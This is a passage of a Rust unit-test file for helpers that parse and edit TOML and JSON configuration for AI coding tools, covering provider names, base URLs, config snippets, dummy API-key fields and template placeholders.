        finalize_toml_text(&lines("a = 1\r\n\r\n\r\n\r\nb = 2\r\n")),
        "a = 1\r\n\r\n\r\n\r\nb = 2\r\n"
    );
}

#[test]
fn crlf_documents_are_edited_without_normalizing_line_endings() {
    let input = "model_provider = \"custom\"\r\nmodel = \"old\"\r\n\r\n[model_providers.custom]\r\nname = \"n\"\r\n";
    assert_eq!(extract_codex_model_name(input).as_deref(), Some("old"));
    let set = set_codex_model_name(input, "new");
    // The rewritten line loses its `\r` (whole-line replacement); others keep it.
    assert_eq!(
        set,
        "model_provider = \"custom\"\r\nmodel = \"new\"\n\r\n[model_providers.custom]\r\nname = \"n\"\r\n"
    );
    assert_eq!(
        extract_codex_base_url(&set_codex_base_url(input, "https://x")).as_deref(),
        Some("https://x")
    );
}

#[test]
fn section_range_matches_headers_exactly() {
    let text = lines("a = 1\n[x]\nb = 2\n\n[ x ]\nc = 3\n[x.y]\nd = 4\n[[arr]]\ne = 5\n");
    let range = get_toml_section_range(&text, "x").unwrap();
    assert_eq!(
        range,
        TomlSectionRange {
            header_line_index: 1,
            body_start_index: 2,
            body_end_index: 4
        }
    );
    assert_eq!(
        get_toml_section_range(&text, " x "),
        Some(TomlSectionRange {
            header_line_index: 4,
            body_start_index: 5,
            body_end_index: 6
        })
    );
    assert_eq!(
        get_toml_section_range(&text, "x.y").unwrap().body_end_index,
        11
    );
    assert_eq!(get_toml_section_range(&text, "arr"), None);
    assert_eq!(get_toml_section_range(&text, "[arr]"), None);
    assert_eq!(get_toml_section_range(&text, "missing"), None);
    assert_eq!(get_top_level_end_index(&text), 1);
    assert_eq!(get_top_level_end_index(&lines("a = 1\nb = 2")), 2);
    assert_eq!(get_toml_section_insert_index(&text, &range), 3);
    // The [[arr]] header is not a section header, so the previous body swallows it.
    let tail = get_toml_section_range(&text, "x.y").unwrap();
    assert_eq!(tail.body_end_index, text.len());
}

#[test]
fn escape_and_unescape_toml_basic_strings() {
    assert_eq!(
        escape_toml_basic_string("a\"b\\c\u{8}\t\n\u{c}\r\u{1}\u{7f}é"),
        "a\\\"b\\\\c\\b\\t\\n\\f\\r\\u0001\u{7f}é"
    );
    assert_eq!(toml_basic_string("x"), "\"x\"");
    assert_eq!(
        unescape_toml_basic_string("a\\\"b\\\\c\\b\\t\\n\\f\\r\\u0001"),
        "a\"b\\c\u{8}\t\n\u{c}\r\u{1}"
    );
    assert_eq!(unescape_toml_basic_string("\\U0001F600"), "😀");
    assert_eq!(
        unescape_toml_basic_string("\\u00e9\\uzzzz\\q\\"),
        "é\\uzzzz\\q\\"
    );
    assert_eq!(unescape_toml_basic_string("\\\\n"), "\\n");
    assert_eq!(unescape_toml_basic_string("plain"), "plain");
    let round_trip = "quote\" back\\ tab\t nul\u{0} 日本";
    assert_eq!(
        unescape_toml_basic_string(&escape_toml_basic_string(round_trip)),
        round_trip
    );
}

#[test]
fn provider_name_resolution() {
    assert_eq!(
        get_codex_model_provider_name("model_provider = \" custom \"\n").as_deref(),
        Some("custom")
    );
    assert_eq!(
        get_codex_provider_section_name("model_provider = 'x'\n").as_deref(),
        Some("model_providers.x")
    );
    assert_eq!(
        get_codex_custom_provider_section_name("model_provider = \"OpenAI\"\n"),
        None
    );
    assert_eq!(
        get_codex_custom_provider_section_name("model_provider = \"x\"\n").as_deref(),
        Some("model_providers.x")
    );
    // Invalid TOML falls back to a top-level-only line scan.
    assert_eq!(
        get_codex_model_provider_name("broken = \nmodel_provider = \"scan\"\n").as_deref(),
        Some("scan")
    );
    assert_eq!(
        get_codex_model_provider_name("broken = \n[p]\nmodel_provider = \"scan\"\n"),
        None
    );
    assert_eq!(get_codex_model_provider_name(""), None);
    assert!(is_custom_codex_model_provider_id("Custom"));
    assert!(!is_custom_codex_model_provider_id("  "));
    for reserved in CODEX_RESERVED_MODEL_PROVIDER_IDS {
        assert!(!is_custom_codex_model_provider_id(reserved));
        assert!(!is_custom_codex_model_provider_id(&reserved.to_uppercase()));
    }
}

#[test]
fn get_codex_base_url_reads_settings_config() {
    let settings = json!({ "config": "model_provider = \"c\"\n\n[model_providers.c]\nbase_url = \"https://x\"\n" });
    assert_eq!(
        get_codex_base_url(Some(&settings)).as_deref(),
        Some("https://x")
    );
    assert_eq!(get_codex_base_url(Some(&json!({ "config": 5 }))), None);
    assert_eq!(get_codex_base_url(None), None);
}

// ---------- JSON helpers ----------

#[test]
fn validate_json_config_messages() {
    assert_eq!(validate_json_config("", None), "");
    assert_eq!(validate_json_config("  \n", None), "");
    assert_eq!(validate_json_config("{\"a\":1}", None), "");
    assert_eq!(validate_json_config("[]", None), "配置必须是 JSON 对象");
    assert_eq!(validate_json_config("null", None), "配置必须是 JSON 对象");
    assert_eq!(validate_json_config("\"s\"", None), "配置必须是 JSON 对象");
    assert_eq!(
        validate_json_config("{", None),
        "配置JSON格式错误，请检查语法"
    );
    assert_eq!(
        validate_json_config("{", Some("通用配置片段")),
        "通用配置片段JSON格式错误，请检查语法"
    );
    assert_eq!(validate_json_config("1", Some("X")), "X必须是 JSON 对象");
}

#[test]
fn update_common_config_snippet_merges_and_removes() {
    let config = "{\n  \"env\": {\n    \"A\": \"1\"\n  },\n  \"list\": [1, 2]\n}";
    let snippet = "{\"env\": {\"B\": \"2\"}, \"list\": [3], \"flag\": true}";

    let merged = update_common_config_snippet(config, snippet, true);
    assert_eq!(merged.error, None);
    assert_eq!(
        merged.updated_config,
        "{\n  \"env\": {\n    \"A\": \"1\",\n    \"B\": \"2\"\n  },\n  \"list\": [\n    3\n  ],\n  \"flag\": true\n}"
    );
    assert!(has_common_config_snippet(&merged.updated_config, snippet));

    let removed = update_common_config_snippet(&merged.updated_config, snippet, false);
    assert_eq!(removed.error, None);
    assert_eq!(
        removed.updated_config,
        "{\n  \"env\": {\n    \"A\": \"1\"\n  }\n}"
    );
    assert!(!has_common_config_snippet(&removed.updated_config, snippet));
}

#[test]
fn update_common_config_snippet_only_removes_matching_values_and_prunes_empty_objects() {
    let config = "{\"a\": {\"b\": 1, \"c\": 2}, \"d\": \"keep\", \"e\": {\"f\": 1}}";
    let snippet = "{\"a\": {\"b\": 1}, \"d\": \"other\", \"e\": {\"f\": 1}, \"missing\": 1}";
    let removed = update_common_config_snippet(config, snippet, false);
    assert_eq!(
        removed.updated_config,
        "{\n  \"a\": {\n    \"c\": 2\n  },\n  \"d\": \"keep\"\n}"
    );
}

#[test]
fn update_common_config_snippet_merge_replaces_non_objects_with_objects() {
    let merged = update_common_config_snippet(
        "{\"a\": 1, \"b\": {\"x\": 1}}",
        "{\"a\": {\"k\": true}, \"b\": [1]}",
        true,
    );
    assert_eq!(
        merged.updated_config,
        "{\n  \"a\": {\n    \"k\": true\n  },\n  \"b\": [\n    1\n  ]\n}"
    );
}

#[test]
fn update_common_config_snippet_error_paths() {
    let bad_config = update_common_config_snippet("{oops", "{\"a\":1}", true);
    assert_eq!(bad_config.updated_config, "{oops");
    assert_eq!(bad_config.error.as_deref(), Some(COMMON_CONFIG_PARSE_ERROR));

    let blank_snippet = update_common_config_snippet("{\"a\":1}", "  ", true);
    assert_eq!(blank_snippet.updated_config, "{\n  \"a\": 1\n}");
    assert_eq!(blank_snippet.error, None);

    let bad_snippet = update_common_config_snippet("{\"a\":1}", "[1]", true);
    assert_eq!(bad_snippet.updated_config, "{\n  \"a\": 1\n}");
    assert_eq!(
        bad_snippet.error.as_deref(),
        Some("通用配置片段必须是 JSON 对象")
    );

    let invalid_snippet = update_common_config_snippet("", "{", false);
    assert_eq!(invalid_snippet.updated_config, "{}");
    assert_eq!(
        invalid_snippet.error.as_deref(),
        Some("通用配置片段JSON格式错误，请检查语法")
    );

    let empty_config = update_common_config_snippet("", "{\"a\": 1}", true);
    assert_eq!(empty_config.updated_config, "{\n  \"a\": 1\n}");
    assert_eq!(empty_config.error, None);

    let json_result = serde_json::to_string(&bad_config).unwrap();
    assert_eq!(
        json_result,
        "{\"updatedConfig\":\"{oops\",\"error\":\"配置 JSON 解析失败，无法应用通用配置\"}"
    );
}

#[test]
fn has_common_config_snippet_semantics() {
    assert!(!has_common_config_snippet("{\"a\":1}", ""));
    assert!(!has_common_config_snippet("{\"a\":1}", "[1]"));
    assert!(!has_common_config_snippet("{oops", "{\"a\":1}"));
    assert!(!has_common_config_snippet("{\"a\":1}", "{oops"));
    assert!(has_common_config_snippet("{\"a\":1,\"b\":2}", "{\"a\":1}"));
    assert!(has_common_config_snippet("", "{}"));
    assert!(!has_common_config_snippet("", "{\"a\":null}"));
    assert!(has_common_config_snippet("{\"a\":null}", "{\"a\":null}"));
    assert!(has_common_config_snippet("{\"a\":1}", "{\"a\":1.0}"));
    // Arrays: same length and index-wise.
    assert!(has_common_config_snippet("{\"l\":[1,2]}", "{\"l\":[1,2]}"));
    assert!(!has_common_config_snippet("{\"l\":[1,2]}", "{\"l\":[2,1]}"));
    assert!(!has_common_config_snippet(
        "{\"l\":[1,2,3]}",
        "{\"l\":[1,2]}"
    ));
    assert!(!has_common_config_snippet("{\"l\":[1]}", "{\"l\":[1,2]}"));
    assert!(has_common_config_snippet(
        "{\"l\":[{\"a\":1,\"b\":2}]}",
        "{\"l\":[{\"a\":1}]}"
    ));
    assert!(!has_common_config_snippet("[1]", "{\"a\":1}"));
}

#[test]
fn get_api_key_from_config_variants() {
    assert_eq!(
        get_api_key_from_config(
            "{\"apiKey\": \"root\", \"env\": {\"ANTHROPIC_AUTH_TOKEN\": \"t\"}}",
            None
        ),
        "root"
    );
    assert_eq!(
        get_api_key_from_config(
            "{\"apiKey\": \"${AWS_KEY}\", \"env\": {\"ANTHROPIC_AUTH_TOKEN\": \"t\"}}",
            None
        ),
        "t"
    );
    assert_eq!(get_api_key_from_config("{\"apiKey\": \"\"}", None), "");
    assert_eq!(
        get_api_key_from_config(
            "{\"env\": {\"ANTHROPIC_AUTH_TOKEN\": \"t\", \"ANTHROPIC_API_KEY\": \"k\"}}",
            None
        ),
        "t"
    );
    assert_eq!(
        get_api_key_from_config("{\"env\": {\"ANTHROPIC_API_KEY\": \"k\"}}", Some("claude")),
        "k"
    );
    assert_eq!(
        get_api_key_from_config("{\"env\": {\"ANTHROPIC_AUTH_TOKEN\": 5}}", None),
        ""
    );
    assert_eq!(
        get_api_key_from_config("{\"env\": {\"GEMINI_API_KEY\": \"g\"}}", Some("gemini")),
        "g"
    );
    assert_eq!(
        get_api_key_from_config("{\"env\": {\"CODEX_API_KEY\": \"c\"}}", Some("codex")),
        "c"
    );
    assert_eq!(
        get_api_key_from_config("{\"env\": {\"ANTHROPIC_API_KEY\": \"k\"}}", Some("codex")),
        ""
    );
    assert_eq!(get_api_key_from_config("{}", None), "");
    assert_eq!(get_api_key_from_config("{\"env\": null}", None), "");
    assert_eq!(get_api_key_from_config("{\"env\": \"str\"}", None), "");
    assert_eq!(get_api_key_from_config("not json", None), "");
    assert_eq!(get_api_key_from_config("", None), "");
    assert_eq!(get_api_key_from_config("null", None), "");
}

#[test]
fn has_api_key_field_variants() {
    assert!(has_api_key_field("{\"apiKey\": \"\"}", None));
    assert!(has_api_key_field("{\"apiKey\": null}", Some("gemini")));
    assert!(has_api_key_field(
        "{\"env\": {\"ANTHROPIC_AUTH_TOKEN\": \"\"}}",
        None
    ));
    assert!(has_api_key_field(
        "{\"env\": {\"ANTHROPIC_API_KEY\": \"\"}}",
        None
    ));
    assert!(!has_api_key_field(
        "{\"env\": {\"GEMINI_API_KEY\": \"\"}}",
        None
    ));
    assert!(has_api_key_field(
        "{\"env\": {\"GEMINI_API_KEY\": \"\"}}",
        Some("gemini")
    ));
    assert!(has_api_key_field(
        "{\"env\": {\"CODEX_API_KEY\": \"\"}}",
        Some("codex")
    ));
    assert!(!has_api_key_field(
        "{\"env\": {\"ANTHROPIC_AUTH_TOKEN\": \"\"}}",
        Some("codex")
    ));
    assert!(!has_api_key_field("{}", None));
    assert!(!has_api_key_field("{\"env\": \"x\"}", None));
    assert!(!has_api_key_field("null", None));
    assert!(!has_api_key_field("[]", None));
    assert!(!has_api_key_field("{oops", None));
}

#[test]
fn set_api_key_in_config_never_creates_by_default() {
    let original = "{\"env\": {\"OTHER\": \"x\"}}";
    assert_eq!(
        set_api_key_in_config(original, "k", SetApiKeyOptions::default()),
        original
    );
    assert_eq!(
        set_api_key_in_config("{}", "k", SetApiKeyOptions::default()),
        "{}"
    );
    assert_eq!(
        set_api_key_in_config(
            "{\"env\": {}}",
            "k",
            SetApiKeyOptions {
                app_type: Some("gemini"),
                ..Default::default()
            }
        ),
        "{\"env\": {}}"
    );
    assert_eq!(
        set_api_key_in_config(
            "{\"env\": {}}",
            "k",
            SetApiKeyOptions {
                app_type: Some("codex"),
                ..Default::default()
            }
        ),
        "{\"env\": {}}"
    );
    // Unparsable input is returned verbatim.
    assert_eq!(
        set_api_key_in_config("{oops", "k", SetApiKeyOptions::default()),
        "{oops"
    );
    assert_eq!(
        set_api_key_in_config(
            "null",
            "k",
            SetApiKeyOptions {
                create_if_missing: true,
                ..Default::default()
            }
        ),
        "null"
    );
    assert_eq!(
        set_api_key_in_config(
            "5",
            "k",
            SetApiKeyOptions {
                create_if_missing: true,
                ..Default::default()
            }
        ),
        "5"
    );
}

#[test]
fn set_api_key_in_config_overwrites_existing_fields() {
    assert_eq!(
        set_api_key_in_config(
            "{\"apiKey\": \"old\", \"env\": {\"ANTHROPIC_AUTH_TOKEN\": \"t\"}}",
            "new",
            SetApiKeyOptions::default()
        ),
        "{\n  \"apiKey\": \"new\",\n  \"env\": {\n    \"ANTHROPIC_AUTH_TOKEN\": \"t\"\n  }\n}"
    );
    assert_eq!(
        set_api_key_in_config("{\"env\": {\"ANTHROPIC_API_KEY\": \"k\", \"ANTHROPIC_AUTH_TOKEN\": \"t\"}}", "new", SetApiKeyOptions::default()),
        "{\n  \"env\": {\n    \"ANTHROPIC_API_KEY\": \"k\",\n    \"ANTHROPIC_AUTH_TOKEN\": \"new\"\n  }\n}"
    );
    assert_eq!(
        set_api_key_in_config(
            "{\"env\": {\"ANTHROPIC_API_KEY\": \"k\"}}",
            "new",
            SetApiKeyOptions::default()
        ),
        "{\n  \"env\": {\n    \"ANTHROPIC_API_KEY\": \"new\"\n  }\n}"
    );
    assert_eq!(
        set_api_key_in_config(
            "{\"env\": {\"GEMINI_API_KEY\": \"g\"}}",
            "new",
            SetApiKeyOptions {
                app_type: Some("gemini"),
                ..Default::default()
            }
        ),
        "{\n  \"env\": {\n    \"GEMINI_API_KEY\": \"new\"\n  }\n}"
    );
    assert_eq!(
        set_api_key_in_config(
            "{\"env\": {\"CODEX_API_KEY\": \"c\"}}",
            "new",
            SetApiKeyOptions {
                app_type: Some("codex"),
                ..Default::default()
            }
        ),
        "{\n  \"env\": {\n    \"CODEX_API_KEY\": \"new\"\n  }\n}"
    );
}

#[test]
fn set_api_key_in_config_creates_when_allowed() {
    let create = SetApiKeyOptions {
        create_if_missing: true,
        ..Default::default()
    };
    assert_eq!(
        set_api_key_in_config("{}", "k", create),
        "{\n  \"env\": {\n    \"ANTHROPIC_AUTH_TOKEN\": \"k\"\n  }\n}"
    );
    assert_eq!(
        set_api_key_in_config(
            "{\"env\": null}",
            "k",
            SetApiKeyOptions {
                api_key_field: Some("ANTHROPIC_API_KEY"),
                ..create
            }
        ),
        "{\n  \"env\": {\n    \"ANTHROPIC_API_KEY\": \"k\"\n  }\n}"
    );
    assert_eq!(
        set_api_key_in_config(
            "{\"a\": 1}",
            "k",
            SetApiKeyOptions {
                app_type: Some("gemini"),
                ..create
            }
        ),
        "{\n  \"a\": 1,\n  \"env\": {\n    \"GEMINI_API_KEY\": \"k\"\n  }\n}"
    );
    assert_eq!(
        set_api_key_in_config(
            "{\"env\": {\"X\": 1}}",
            "k",
            SetApiKeyOptions {
                app_type: Some("codex"),
                ..create
            }
        ),
        "{\n  \"env\": {\n    \"X\": 1,\n    \"CODEX_API_KEY\": \"k\"\n  }\n}"
    );
    // An existing Anthropic key wins over api_key_field.
    assert_eq!(
        set_api_key_in_config(
            "{\"env\": {\"ANTHROPIC_API_KEY\": \"o\"}}",
            "k",
            SetApiKeyOptions {
                api_key_field: Some("ANTHROPIC_AUTH_TOKEN"),
                ..create
            }
        ),
        "{\n  \"env\": {\n    \"ANTHROPIC_API_KEY\": \"k\"\n  }\n}"
    );
}

#[test]
fn apply_template_values_replaces_placeholders_deeply() {
    let config = json!({
        "env": { "ANTHROPIC_BASE_URL": "https://${REGION}.example/${REGION}", "K": "${MISSING}" },
        "list": ["${REGION}", 1, null, { "n": "${EMPTY}x" }],
        "n": 3
    });
    let region = TemplateValueConfig {
        label: "Region".into(),
        placeholder: "".into(),
        default_value: Some("us".into()),
        editor_value: Some("eu".into()),
    };
    let empty = TemplateValueConfig {
        default_value: Some("default".into()),
        editor_value: Some(String::new()),
        ..Default::default()
    };
    let fallback = TemplateValueConfig {
        default_value: Some("d".into()),
        editor_value: None,
        ..Default::default()
    };
    let values = [
        ("REGION", &region),
        ("EMPTY", &empty),
        ("FALLBACK", &fallback),
    ];
    let result = apply_template_values(&config, values.iter().copied());
    assert_eq!(
        result,
        json!({
            "env": { "ANTHROPIC_BASE_URL": "https://eu.example/eu", "K": "${MISSING}" },
            "list": ["eu", 1, null, { "n": "x" }],
            "n": 3
        })
    );
    assert_eq!(resolve_template_value(&fallback), "d");
    assert_eq!(resolve_template_value(&TemplateValueConfig::default()), "");
    // No template values → structural copy.
    assert_eq!(apply_template_values(&config, std::iter::empty()), config);
    // Scalars pass through.
    assert_eq!(
        apply_template_values(&json!("${REGION}"), values.iter().copied()),
        json!("eu")
    );
    assert_eq!(
        apply_template_values(&json!(true), values.iter().copied()),
        json!(true)
    );
}

#[test]
fn template_value_config_deserializes_camel_case() {
    let parsed: TemplateValueConfig = serde_json::from_str(
        "{\"label\":\"L\",\"placeholder\":\"P\",\"defaultValue\":\"d\",\"editorValue\":\"e\"}",
    )
    .unwrap();
    assert_eq!(parsed.default_value.as_deref(), Some("d"));
    assert_eq!(parsed.editor_value.as_deref(), Some("e"));
    let without_editor: TemplateValueConfig =
        serde_json::from_str("{\"label\":\"L\",\"placeholder\":\"P\"}").unwrap();
    assert_eq!(without_editor.editor_value, None);
}

// ---------- TOML snippet ----------

#[test]
fn has_toml_common_config_snippet_structural_and_fuzzy() {
    let config = "model = \"gpt\"\n\n[features]\ngoals = true\nlist = [1, 2]\n";
    assert!(!has_toml_common_config_snippet(config, "  "));
    assert!(has_toml_common_config_snippet(
        config,
        "[features]\ngoals = true\n"
    ));
    assert!(has_toml_common_config_snippet(
        config,
        "[features]\nlist = [1, 2]\n"
    ));
    assert!(!has_toml_common_config_snippet(
        config,
        "[features]\nlist = [2, 1]\n"
    ));
    assert!(!has_toml_common_config_snippet(
        config,
        "[features]\nlist = [1]\n"
    ));
    assert!(!has_toml_common_config_snippet(
        config,
        "[features]\ngoals = false\n"
    ));
    assert!(!has_toml_common_config_snippet(config, "missing = 1\n"));
    assert!(has_toml_common_config_snippet("x = 1\n", "x = 1.0\n"));
    assert!(has_toml_common_config_snippet(config, "model = “gpt”\n"));
    assert!(!has_toml_common_config_snippet("", "\n"));
    assert!(has_toml_common_config_snippet(
        "a = 1\n",
        "# comment only\n"
    ));
    assert!(!has_toml_common_config_snippet("", "a = 1"));
    // Parse failure falls back to whitespace-insensitive containment.
    assert!(has_toml_common_config_snippet(
        "broken = \n[features]\ngoals   =  true\n",
        "[features]\ngoals = true"
    ));
    assert!(!has_toml_common_config_snippet(
        "broken = \n",
        "[features]\ngoals = true"
    ));
    assert!(has_toml_common_config_snippet("a = 1\n", "a = \n"));
}

#[test]
fn toml_is_subset_datetime_never_matches() {
    let target: toml::Table = toml::from_str("d = 1979-05-27\n").unwrap();
    let source = target.clone();
    assert!(!toml_is_subset(
        &TomlValue::Table(target),
        &TomlValue::Table(source)
    ));
}
